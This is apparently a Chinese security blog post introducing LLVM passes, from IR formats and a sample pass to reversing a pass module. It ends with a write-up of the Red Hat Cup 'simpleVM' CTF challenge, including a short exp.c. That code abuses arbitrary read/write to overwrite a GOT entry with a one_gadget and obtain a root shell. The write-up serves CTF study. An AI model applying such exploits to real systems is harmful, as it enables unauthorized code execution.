> 原文链接: https://www.anquanke.com//post/id/240748 


# LLVM PASS PWN


                                阅读量   
                                **204702**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">2</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p3.ssl.qhimg.com/t011bac1c8693b19d77.jpg)](https://p3.ssl.qhimg.com/t011bac1c8693b19d77.jpg)



## 0x00 前言

从红帽杯的`simpleVM`一题学习LLVM PASS，理解并运行我们的第一个LLVM PASS，然后逆向分析LLVM PASS的模块。



## 0x01 LLVM PASS

Pass就是“遍历一遍IR，可以同时对它做一些操作”的意思。<br>
LLVM的核心库中会给你一些 Pass类 去继承。你需要实现它的一些方法。 最后使用LLVM的编译器会把它翻译得到的IR传入Pass里，给你遍历和修改。

LLVM Pass有什么用呢？<br>
1.显然它的一个用处就是插桩，在Pass遍历LLVM IR的同时，自然就可以往里面插入新的代码。<br>
2.机器无关的代码优化：大家如果还记得编译原理的知识的话，应该知道IR在被翻译成机器码前会做一些机器无关的优化。 但是不同的优化方法之间需要解耦，所以自然要各自遍历一遍IR，实现成了一个个LLVM Pass。 最终，基于LLVM的编译器会在前端生成LLVM IR后调用一些LLVM Pass做机器无关优化， 然后再调用LLVM后端生成目标平台代码。<br>
3.等等



## 0x02 LLVM IR

传给LLVM PASS进行优化的数据是LLVM IR，即代码的中间表示，LLVM IR有三种表示形式

```
1、.ll 格式：人类可以阅读的文本。
2、.bc 格式：适合机器存储的二进制文件。
3、内存表示
```

从对应格式转化到另一格式的命令如下：

```
.c -&gt; .ll：clang -emit-llvm -S a.c -o a.ll
.c -&gt; .bc: clang -emit-llvm -c a.c -o a.bc
.ll -&gt; .bc: llvm-as a.ll -o a.bc
.bc -&gt; .ll: llvm-dis a.bc -o a.ll
.bc -&gt; .s: llc a.bc -o a.s
```

如下是我们的一个简易程序

```
#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;

int main() `{`
   char name[0x10];
   read(0,name,0x10);
   write(1,name,0x10);
   printf("bye\n");
`}`
```

通过命令

```
clang -emit-llvm -S main.c -o main.ll
```

可以生成IR文本文件

```
; ModuleID = 'main.c'
source_filename = "main.c"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-pc-linux-gnu"

@.str = private unnamed_addr constant [5 x i8] c"bye\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define i32 @main() #0 `{`
  %1 = alloca [16 x i8], align 16
  %2 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i32 0, i32 0
  %3 = call i64 @read(i32 0, i8* %2, i64 16)
  %4 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i32 0, i32 0
  %5 = call i64 @write(i32 1, i8* %4, i64 16)
  %6 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0))
  ret i32 0
`}`

declare i64 @read(i32, i8*, i64) #1

declare i64 @write(i32, i8*, i64) #1

declare i32 @printf(i8*, ...) #1

attributes #0 = `{` noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" `}`
attributes #1 = `{` "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" `}`

!llvm.module.flags = !`{`!0`}`
!llvm.ident = !`{`!1`}`

!0 = !`{`i32 1, !"wchar_size", i32 4`}`
!1 = !`{`!"clang version 6.0.0-1ubuntu2 (tags/RELEASE_600/final)"`}`
```

从中可以看到IR中间代码表示的非常直观易懂，而LLVM PASS就是用于处理IR，将一些能够优化掉的语句进行优化。



## 0x03 编写一个简单的LLVM PASS

从官方文档里，我们可以找到一个简易的示例

```
#include "llvm/Pass.h"
#include "llvm/IR/Function.h"
#include "llvm/Support/raw_ostream.h"
#include "llvm/IR/LegacyPassManager.h"
#include "llvm/Transforms/IPO/PassManagerBuilder.h"

using namespace llvm;

namespace `{`
  struct Hello : public FunctionPass `{`
    static char ID;
    Hello() : FunctionPass(ID) `{``}`
    bool runOnFunction(Function &amp;F) override `{`
      errs() &lt;&lt; "Hello: ";
      errs().write_escaped(F.getName()) &lt;&lt; '\n';
      return false;
    `}`
  `}`;
`}`

char Hello::ID = 0;

// Register for opt
static RegisterPass&lt;Hello&gt; X("hello", "Hello World Pass");

// Register for clang
static RegisterStandardPasses Y(PassManagerBuilder::EP_EarlyAsPossible,
  [](const PassManagerBuilder &amp;Builder, legacy::PassManagerBase &amp;PM) `{`
    PM.add(new Hello());
  `}`);
```

该示例用于遍历IR中的函数，因此结构体`Hello`继承了`FunctionPass`，并重写了`runOnFunction`函数，那么每遍历到一个函数时，`runOnFunction`都会被调用，因此该程序会输出函数名。为了测试，我们需要将其编译为模块

```
clang `llvm-config --cxxflags` -Wl,-znodelete -fno-rtti -fPIC -shared Hello.cpp -o LLVMHello.so `llvm-config --ldflags`
```

然后我们以前面那个简易程序的IR为例

```
root@ubuntu:~/Desktop# opt -load LLVMHello.so -hello main.ll
WARNING: You're attempting to print out a bitcode file.
This is inadvisable as it may cause display problems. If
you REALLY want to taste LLVM bitcode first-hand, you
can force output with the `-f' option.

Hello: main
```

其中参数中的`-hello`是我们在代码中注册的名字

```
// Register for opt
static RegisterPass&lt;Hello&gt; X("hello", "Hello World Pass");
```

现在，我们在前面基础上加入对函数中的代码进行遍历的操作

```
#include "llvm/Pass.h"
#include "llvm/IR/Function.h"
#include "llvm/Support/raw_ostream.h"
#include "llvm/IR/LegacyPassManager.h"
#include "llvm/Transforms/IPO/PassManagerBuilder.h"

using namespace llvm;

namespace `{`
  struct Hello : public FunctionPass `{`
    static char ID;
    Hello() : FunctionPass(ID) `{``}`
    bool runOnFunction(Function &amp;F) override `{`
      errs() &lt;&lt; "Hello: ";
      errs().write_escaped(F.getName()) &lt;&lt; '\n';
      SymbolTableList&lt;BasicBlock&gt;::const_iterator bbEnd = F.end();
      for(SymbolTableList&lt;BasicBlock&gt;::const_iterator bbIter=F.begin(); bbIter!=bbEnd; ++bbIter)`{`
         SymbolTableList&lt;Instruction&gt;::const_iterator instIter = bbIter-&gt;begin();
         SymbolTableList&lt;Instruction&gt;::const_iterator instEnd  = bbIter-&gt;end();
         for(; instIter != instEnd; ++instIter)`{`
            errs() &lt;&lt; "opcode=" &lt;&lt; instIter-&gt;getOpcodeName() &lt;&lt; " NumOperands=" &lt;&lt; instIter-&gt;getNumOperands() &lt;&lt; "\n";
         `}`
      `}`
      return false;
    `}`
  `}`;
`}`

char Hello::ID = 0;

// Register for opt
static RegisterPass&lt;Hello&gt; X("hello", "Hello World Pass");

// Register for clang
static RegisterStandardPasses Y(PassManagerBuilder::EP_EarlyAsPossible,
  [](const PassManagerBuilder &amp;Builder, legacy::PassManagerBase &amp;PM) `{`
    PM.add(new Hello());
`}`);
```

然后以同样的方式运行

```
root@ubuntu:~/Desktop# opt -load LLVMHello.so -hello main.ll
WARNING: You're attempting to print out a bitcode file.
This is inadvisable as it may cause display problems. If
you REALLY want to taste LLVM bitcode first-hand, you
can force output with the `-f' option.

Hello: main
opcode=alloca NumOperands=1
opcode=getelementptr NumOperands=3
opcode=call NumOperands=4
opcode=getelementptr NumOperands=3
opcode=call NumOperands=4
opcode=call NumOperands=2
opcode=ret NumOperands=1
```

可以看到成功遍历出了函数中的指令操作



## 0x04 LLVM PASS模块逆向分析

### <a class="reference-link" name="%E5%88%86%E6%9E%90"></a>分析

现在，我们将`LLVMHello.so`模块放入IDA进行静态分析<br>
在初始化函数，调用了函数进行对象的创建

[![](https://p2.ssl.qhimg.com/t01323ff233ba14df8c.png)](https://p2.ssl.qhimg.com/t01323ff233ba14df8c.png)

该函数如下

[![](https://p5.ssl.qhimg.com/t011648c3b2baaa1b6f.png)](https://p5.ssl.qhimg.com/t011648c3b2baaa1b6f.png)

我们需要关注一下虚表结构，这样才方便我们确定各函数的位置

[![](https://p0.ssl.qhimg.com/t019ef96c50281b9b48.png)](https://p0.ssl.qhimg.com/t019ef96c50281b9b48.png)

可以看到`runOnFunction`函数位于虚表中的最后一个位置，并且由于`runOnFunction`函数被我们重写，其指向的是我们自定义的那个函数,由此我们跟进

[![](https://p5.ssl.qhimg.com/t0199805ad5915848d2.png)](https://p5.ssl.qhimg.com/t0199805ad5915848d2.png)

可以看到这正是我们重写的`runOnFunction`函数，因此对于LLVM PASS，定位函数的位置因从虚表入手。

### <a class="reference-link" name="%E8%B0%83%E8%AF%95"></a>调试

由于模块是动态加载的，并且运行时也不会暂停下来等我们用调试器去`Attach`，因此我们可以直接使用IDA来进行调试，其参数设置如下

[![](https://p0.ssl.qhimg.com/t0174bb3094a483b8f2.png)](https://p0.ssl.qhimg.com/t0174bb3094a483b8f2.png)

在模块需要调试的地方设置断点，然后使用IDA来启动`opt`程序即可进行模块的调试

[![](https://p3.ssl.qhimg.com/t01bab2e094e6defb98.png)](https://p3.ssl.qhimg.com/t01bab2e094e6defb98.png)



## 0x05 红帽杯 simpleVM

### <a class="reference-link" name="%E5%88%86%E6%9E%90"></a>分析

首先找到注册函数

[![](https://p4.ssl.qhimg.com/t01dffebcf98ad099ac.png)](https://p4.ssl.qhimg.com/t01dffebcf98ad099ac.png)

跟进以后，找到虚表位置

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t017d4c9fddd1070de3.png)

找到`runOnFunction`函数的地址

[![](https://p2.ssl.qhimg.com/t0182db0283a4d1a93e.png)](https://p2.ssl.qhimg.com/t0182db0283a4d1a93e.png)

这里先是对当前遍历到的函数名进行匹配

[![](https://p2.ssl.qhimg.com/t01b86d228280cb4d46.png)](https://p2.ssl.qhimg.com/t01b86d228280cb4d46.png)

如果函数名是`o0o0o0o0`，则调用函数`sub_7F5C11B24AC0`进行进一步处理

[![](https://p2.ssl.qhimg.com/t018166487d78e76506.png)](https://p2.ssl.qhimg.com/t018166487d78e76506.png)

可以看到该函数遍历IR中`o0o0o0o0`函数中的`BasicBlock(基本代码块)`，然后继续调用`sub_7F5C11B24B80`函数进行处理<br>
该函数会遍历`BasicBlock(基本代码块)`中的指令，然后匹配到对应指令后进行处理，这里匹配到`add函数`时，会根据其操作数1的值，来选择对应的存储区（这里我们可以看做寄存器），将操作数2累加上去

[![](https://p1.ssl.qhimg.com/t011efea09ab4c80f42.png)](https://p1.ssl.qhimg.com/t011efea09ab4c80f42.png)

当匹配到`load`操作时，将对应的寄存器中的值看做是地址，从地址中取出8字节数据存入另一个寄存器中

[![](https://p3.ssl.qhimg.com/t01521200b12176114f.png)](https://p3.ssl.qhimg.com/t01521200b12176114f.png)

可以看到`load`的处理过程中，并没有边界检查，而且其寄存器中的值可以通过`add`来完全控制，由此这里出现一个`任意地址读`的漏洞，同理，我们看到`store`，同理存在`任意地址写`的漏洞。

[![](https://p2.ssl.qhimg.com/t01955f98443fefee6f.png)](https://p2.ssl.qhimg.com/t01955f98443fefee6f.png)

### <a class="reference-link" name="%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"></a>漏洞利用

由于优化器`opt-8`未开启PIE和GOT完全保护，因此，可以借助`add、load、store`来完成对`opt-8`二进制程序的GOT表的改写，可以直接将`opt-8`二进制程序的GOT表中的free表项改为`one_gadget`，即可获得`shell`<br>
exp.c

```
void store(int a);
void load(int a);
void add(int a, int b);

void o0o0o0o0()`{`
    add(1, 0x77e100);
    load(1);
    add(2, 0x729ec);
    store(1);
`}`
```

使用`clang -emit-llvm -S exp.c -o exp.ll`得到IR文本文件，然后传给`opt-8`进行优化

```
root@ubuntu:~/Desktop# ./opt-8 -load ./VMPass.so -VMPass ./exp.ll
WARNING: You're attempting to print out a bitcode file.
This is inadvisable as it may cause display problems. If
you REALLY want to taste LLVM bitcode first-hand, you
can force output with the `-f' option.

# whoami
root
#
```



## 0x06 感想

学习并入门了LLVM PASS，收获很多！



## 0x07 参考

[[红帽杯 2021] PWN – Writeup](https://eqqie.cn/index.php/laji_note/1655/)<br>[Writing an LLVM Pass — LLVM 12 documentation](https://llvm.org/docs/WritingAnLLVMPass.html)<br>[LLVM Pass入门导引](https://zhuanlan.zhihu.com/p/122522485)<br>[LLVM Pass 简介（2）](https://www.cnblogs.com/jourluohua/p/14556184.html)
